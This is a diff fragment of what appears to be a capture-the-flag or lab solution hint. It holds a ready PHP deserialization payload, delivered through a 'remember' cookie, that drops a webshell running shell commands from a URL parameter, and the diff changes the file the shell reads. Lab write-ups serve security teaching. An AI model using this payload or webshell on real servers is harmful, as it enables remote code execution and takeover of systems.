@@ -33,5 +33,5 @@ is a PHP webshell. Base64 it, set it as the `remember` cookie, make a request.
 O:11:"CacheWriter":2:{s:4:"file";s:23:"/var/www/html/sh3ll.php";s:4:"data";s:28:"<?php system($_GET['c']); ?>";}
 ```
 Count the string lengths exactly, or build it in code. Base64-encode the whole thing. Then browse to
-your dropped shell: `/sh3ll.php?c=cat /flag.txt`.
+your dropped shell: `/sh3ll.php?c=cat /proof.txt`.
 </details>
